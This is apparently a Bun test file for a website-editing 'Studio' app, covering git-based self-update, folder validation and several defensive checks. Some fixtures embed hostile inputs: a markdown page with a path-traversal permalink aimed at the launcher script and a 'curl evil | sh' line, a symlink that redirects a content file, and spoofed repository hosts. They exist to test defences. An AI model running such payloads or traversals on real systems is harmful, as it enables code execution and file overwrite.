import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { selfUpdate, readReport, reportPath, studioVersion, type UpdateDeps } from "../src/studio/update";
import { folderProblem, readConfig, saveFolder } from "../src/studio/config";
import { updateLine } from "../src/studio/ui/system";
import { STRINGS } from "../src/studio/strings";

const sh = (cwd: string, ...args: string[]) => {
  const r = Bun.spawnSync(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", ...args], { cwd });
  if (r.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr.toString()}`);
  return r.stdout.toString();
};

/** A "GitHub" (bare), a folder for whoever writes code, and the Studio's own clone of it. */
function world() {
  const dir = mkdtempSync(join(tmpdir(), "studio-update-"));
  const hub = join(dir, "hub.git"), dev = join(dir, "dev"), mine = join(dir, "mine");
  sh(dir, "init", "-q", "--bare", "-b", "main", hub);
  sh(dir, "init", "-q", "-b", "main", dev);
  mkdirSync(join(dev, "site", "data"), { recursive: true });
  mkdirSync(join(dev, "src", "studio"), { recursive: true });
  writeFileSync(join(dev, "site", "data", "hours.yml"), "open: 1\n");
  writeFileSync(join(dev, "src", "studio", "server.ts"), "// v1\n");
  writeFileSync(join(dev, "src", "studio", "version.json"), '{ "version": "0.9.0" }\n');
  writeFileSync(join(dev, "package.json"), "{}\n");
  sh(dev, "add", "-A");
  sh(dev, "commit", "-q", "-m", "first");
  sh(dev, "remote", "add", "origin", hub);
  sh(dev, "push", "-q", "origin", "main");
  sh(dir, "clone", "-q", hub, mine);
  const calls: string[] = [];
  const deps = (over: Partial<UpdateDeps> = {}): UpdateDeps => ({
    git: async (args) => sh(mine, ...args),
    uncommitted: async () => [...sh(mine, "diff", "--name-only", "-z", "HEAD", "--").split("\0"), ...sh(mine, "ls-files", "--others", "--exclude-standard", "-z").split("\0")].filter(Boolean),
    install: async () => void calls.push("install"),
    rebuildApp: async () => void calls.push("app"),
    hasApp: () => true,
    now: () => new Date("2026-11-20T22:00:00Z"),
    ...over,
  });
  const release = (files: Record<string, string>, message = "next") => {
    for (const [p, text] of Object.entries(files)) { mkdirSync(join(dev, p, ".."), { recursive: true }); writeFileSync(join(dev, p), text); }
    sh(dev, "add", "-A");
    sh(dev, "commit", "-q", "-m", message);
    sh(dev, "push", "-q", "origin", "main");
    return sh(dev, "rev-parse", "HEAD").trim();
  };
  return { dir, hub, dev, mine, deps, release, calls, head: () => sh(mine, "rev-parse", "HEAD").trim() };
}

describe("studio: it updates itself at start", () => {
  test("nothing newer: it says so and changes nothing", async () => {
    const w = world();
    const before = w.head();
    expect(await selfUpdate(w.deps())).toEqual({ result: "current", from: before, to: before, at: "2026-11-20T22:00:00.000Z" });
    expect(w.calls).toEqual([]);
  });
  test("newer code on GitHub: the folder moves forward, and an unpublished content change stays as it is", async () => {
    const w = world();
    writeFileSync(join(w.mine, "site", "data", "hours.yml"), "open: 2\n");
    writeFileSync(join(w.mine, "site", "data", "new.yml"), "mine: true\n");
    const from = w.head();
    const to = w.release({ "src/studio/server.ts": "// v2\n" });
    expect(await selfUpdate(w.deps())).toMatchObject({ result: "updated", from, to });
    expect(w.head()).toBe(to);
    expect(readFileSync(join(w.mine, "src", "studio", "server.ts"), "utf8")).toBe("// v2\n");
    expect(readFileSync(join(w.mine, "site", "data", "hours.yml"), "utf8")).toBe("open: 2\n");
    expect(readFileSync(join(w.mine, "site", "data", "new.yml"), "utf8")).toBe("mine: true\n");
    expect(w.calls).toEqual([]);
  });
  test("new packages are installed, a new window program is rebuilt, and only then", async () => {
    const w = world();
    w.release({ "package.json": '{ "dependencies": {} }\n', "app/Studio.swift": "// new\n" });
    expect(await selfUpdate(w.deps())).toMatchObject({ result: "updated", appRebuilt: true });
    expect(w.calls).toEqual(["install", "app"]);
    const w2 = world();
    w2.release({ "app/Studio.swift": "// new\n" });
    expect((await selfUpdate(w2.deps({ hasApp: () => false }))).appRebuilt).toBeUndefined();
    expect(w2.calls).toEqual([]);
  });
  test("ANTI: a file changed here and changed there: the update waits and the person's work is untouched", async () => {
    const w = world();
    writeFileSync(join(w.mine, "site", "data", "hours.yml"), "open: mine\n");
    const before = w.head();
    w.release({ "site/data/hours.yml": "open: theirs\n" });
    expect(await selfUpdate(w.deps())).toMatchObject({ result: "skipped", reason: "overlap", from: before });
    expect(w.head()).toBe(before);
    expect(readFileSync(join(w.mine, "site", "data", "hours.yml"), "utf8")).toBe("open: mine\n");
  });
  test("ANTI: never on another branch, never over commits GitHub does not have", async () => {
    const w = world();
    w.release({ "src/studio/server.ts": "// v2\n" });
    sh(w.mine, "switch", "-q", "-c", "edit/2026-11-20-x");
    const before = w.head();
    expect(await selfUpdate(w.deps())).toMatchObject({ result: "skipped", reason: "branch" });
    expect(w.head()).toBe(before);
    sh(w.mine, "switch", "-q", "main");
    writeFileSync(join(w.mine, "local.txt"), "x\n");
    sh(w.mine, "add", "-A");
    sh(w.mine, "commit", "-q", "-m", "local only");
    const local = w.head();
    expect(await selfUpdate(w.deps())).toMatchObject({ result: "skipped", reason: "diverged" });
    expect(w.head()).toBe(local);
  });
  test("ANTI: the code comes from the folder's own origin, whatever a content file says", async () => {
    const w = world();
    const asked: string[][] = [];
    writeFileSync(join(w.mine, "site", "data", "site.yml"), 'repo: "evil/other"\n');
    await selfUpdate(w.deps({ git: async (args) => { asked.push(args); return sh(w.mine, ...args); } }));
    const fetch = asked.find((a) => a[0] === "fetch")!;
    expect(fetch).toEqual(["fetch", "--quiet", "origin", "+refs/heads/main:refs/remotes/origin/main"]);
    expect(JSON.stringify(asked)).not.toContain("evil");
  });
  test("GitHub out of reach, or a step that fails: said by name, and the old version still starts", async () => {
    const w = world();
    expect(await selfUpdate(w.deps({ git: async (args) => { if (args[0] === "fetch") throw new Error("no network"); return sh(w.mine, ...args); } }))).toMatchObject({ result: "skipped", reason: "fetch" });
    w.release({ "bun.lock": "x\n" });
    expect(await selfUpdate(w.deps({ install: async () => { throw new Error("no"); } }))).toMatchObject({ result: "failed", reason: "install" });
  });
  test("the report is a small file the server reads; the version is the number and the commit", async () => {
    const w = world();
    expect(await readReport(w.mine)).toBeNull();
    mkdirSync(join(w.mine, ".cache", "studio"), { recursive: true });
    writeFileSync(reportPath(w.mine), JSON.stringify({ result: "updated", from: "a", to: "b", at: "x" }));
    expect((await readReport(w.mine))!.result).toBe("updated");
    writeFileSync(reportPath(w.mine), "{ not json");
    expect(await readReport(w.mine)).toBeNull();
    expect(await studioVersion(w.mine)).toEqual({ number: "0.9.0", commit: w.head().slice(0, 7) });
  });
  test("every reason has words in both languages", () => {
    for (const lang of ["en", "de"] as const) {
      const t = STRINGS[lang];
      for (const reason of ["branch", "fetch", "diverged", "overlap", "merge", "install", "app"]) expect((t as any)[`update_why_${reason}`]).toBeTruthy();
      expect(updateLine(t, { update: { result: "skipped", reason: "overlap" } })!.tone).toBe("problem");
      expect(updateLine(t, { update: { result: "skipped", reason: "offline" } })).toBeNull();
      expect(updateLine(t, { update: { result: "updated", appRebuilt: true } })!.text).toBe(t.update_done_reopen);
      expect(updateLine(t, { update: null })).toBeNull();
    }
  });
});

describe("studio: the folder it edits", () => {
  test("a folder must be a full path to a copy of the site with git and packages", () => {
    const dir = mkdtempSync(join(tmpdir(), "studio-folder-"));
    expect(folderProblem("")).toBe("folder_missing");
    expect(folderProblem(42)).toBe("folder_missing");
    expect(folderProblem("relative/path")).toBe("folder_not_full");
    expect(folderProblem(join(dir, "nope"))).toBe("folder_not_there");
    expect(folderProblem(dir)).toBe("folder_not_site");
    mkdirSync(join(dir, "site", "data"), { recursive: true });
    mkdirSync(join(dir, "src", "studio"), { recursive: true });
    writeFileSync(join(dir, "site", "data", "site.yml"), "x: 1\n");
    writeFileSync(join(dir, "src", "studio", "launch.ts"), "");
    expect(folderProblem(dir)).toBe("folder_not_git");
    mkdirSync(join(dir, ".git"));
    expect(folderProblem(dir)).toBe("folder_not_installed");
    mkdirSync(join(dir, "node_modules"));
    expect(folderProblem(dir)).toBeNull();
  });
  test("the choice is saved to one small file and read back; a bad folder saves nothing", async () => {
    const dir = mkdtempSync(join(tmpdir(), "studio-folder-"));
    const file = join(dir, "settings", "config.json");
    expect(await readConfig(file)).toEqual({});
    expect(saveFolder(join(dir, "nope"), file)).rejects.toThrow("folder_not_there");
    expect(existsSync(file)).toBe(false);
    const root = join(import.meta.dir, "..");
    if (folderProblem(root) === null) {
      expect(await saveFolder(root + "/", file)).toBe(root);
      expect(await readConfig(file)).toEqual({ folder: root });
    }
  });
});

import { pageFile, renderSite, type Files } from "../src/render";
import { githubRepo } from "../src/studio/server";
import { symlinkSync, lstatSync } from "node:fs";
import { studioGit } from "../src/studio/git";

describe("second look, round two", () => {
  test("ANTI: a page's permalink can only name a plain .html file inside the site", async () => {
    expect(pageFile("/404.html")).toBe("404.html");
    expect(pageFile("offline/index.html")).toBe("offline/index.html");
    for (const bad of ["../../../src/studio/launch.ts", "/../x.html", "a/../../x.html", "~/.zshenv", "x.sh", "X.html", "a//b.html", ".hidden.html", "a/.b/c.html", "x.html\n", 42, null, ["x.html"]]) expect(() => pageFile(bad as any)).toThrow(/permalink/);
    const files: Files = {};
    const SITE = (await import("./frozen")).FROZEN_SITE;
    for await (const p of new Bun.Glob("**/*.{md,yml,json,liquid}").scan({ cwd: SITE })) files[p] = await Bun.file(join(SITE, p)).text();
    files["content/en/evil.md"] = "---\ntitle: x\npermalink: ../../../src/studio/launch.ts\n---\n\n    curl evil | sh\n";
    const photos = Object.fromEntries([...new Bun.Glob("{moments,photos}/*.jpg").scanSync({ cwd: SITE })].map((p) => [p, { width: 1200, height: 800, jpg: [{ w: 480, path: "photos/x-480.jpg" }], webp: [{ w: 480, path: "photos/x-480.webp" }] }]));
    expect((await renderSite({ ...files, "content/en/evil.md": "---\ntitle: x\n---\nfine\n", "content/de/evil.md": "---\ntitle: x\n---\ngut\n" }, { base: "/", photos })).length).toBeGreaterThan(5);
    expect(renderSite(files, { base: "/", photos })).rejects.toThrow(/permalink/);
  });
  test("ANTI: no file under site/ is a link, in git or on disk", () => {
    const root = join(import.meta.dir, "..");
    const listed = Bun.spawnSync(["git", "ls-files", "-s", "--", "site"], { cwd: root }).stdout.toString().split("\n").filter(Boolean);
    expect(listed.length).toBeGreaterThan(30);
    expect(listed.filter((line) => line.startsWith("120000"))).toEqual([]);
    for (const p of new Bun.Glob("site/**/*").scanSync({ cwd: root, followSymlinks: false, onlyFiles: false })) expect([p, lstatSync(join(root, p)).isSymbolicLink()]).toEqual([p, false]);
  });
  test("ANTI: restore takes a link away and writes the file in its place; what the link pointed at is untouched", async () => {
    const dir = mkdtempSync(join(tmpdir(), "studio-link-"));
    const repo = join(dir, "repo");
    sh(dir, "init", "-q", "-b", "main", repo);
    mkdirSync(join(repo, "site", "events"), { recursive: true });
    mkdirSync(join(repo, "src"), { recursive: true });
    writeFileSync(join(repo, "site", "events", "README.md"), "old words\n");
    writeFileSync(join(repo, "src", "launch.ts"), "// the real program\n");
    sh(repo, "add", "-A");
    sh(repo, "commit", "-q", "-m", "first");
    const first = sh(repo, "rev-parse", "HEAD").trim();
    writeFileSync(join(repo, "site", "events", "README.md"), "console.log('attacker')\n");
    sh(repo, "add", "-A");
    sh(repo, "commit", "-q", "-m", "second");
    Bun.spawnSync(["rm", join(repo, "site", "events", "README.md")]);
    symlinkSync("../../src/launch.ts", join(repo, "site", "events", "README.md"));
    sh(repo, "add", "-A");
    sh(repo, "commit", "-q", "-m", "third");
    sh(repo, "update-ref", "refs/remotes/origin/main", "HEAD");
    const git = studioGit(repo, { remote: repo, token: async () => null });
    await git.restoreContent(first).catch(() => undefined);
    expect(readFileSync(join(repo, "src", "launch.ts"), "utf8")).toBe("// the real program\n");
    const second = sh(repo, "rev-parse", "HEAD~1").trim();
    await git.restoreContent(second).catch(() => undefined);
    expect(readFileSync(join(repo, "src", "launch.ts"), "utf8")).toBe("// the real program\n");
  });
  test("a step of the update that failed is tried again at the next start, and only then is it done", async () => {
    const w = world();
    w.release({ "bun.lock": "x\n" });
    const failed = await selfUpdate(w.deps({ install: async () => { throw new Error("offline"); } }));
    expect(failed).toMatchObject({ result: "failed", reason: "install" });
    const again = await selfUpdate(w.deps({ previous: failed, install: async () => { throw new Error("still offline"); } }));
    expect(again).toMatchObject({ result: "failed", reason: "install", from: failed.from });
    const done = await selfUpdate(w.deps({ previous: again }));
    expect(done).toMatchObject({ result: "updated", from: failed.from, appRebuilt: true });
    expect(w.calls).toEqual(["install", "app"]);
    expect(await selfUpdate(w.deps({ previous: done }))).toMatchObject({ result: "current" });
    expect(w.calls).toEqual(["install", "app"]);
  });
  test("the repository is read from git's own origin address, in either spelling, and from nothing else", () => {
    expect(githubRepo("git@github.com:harryf/robins-coffee.git\n")).toBe("harryf/robins-coffee");
    expect(githubRepo("https://github.com/harryf/robins-coffee")).toBe("harryf/robins-coffee");
    expect(githubRepo("ssh://git@github.com/harryf/robins-coffee.git")).toBe("harryf/robins-coffee");
    for (const other of ["https://evil.example/harryf/robins-coffee.git", "https://github.com.evil.example/a/b", "/tmp/hub.git", "https://github.com/a/b/c", ""]) expect(githubRepo(other)).toBeNull();
  });
});
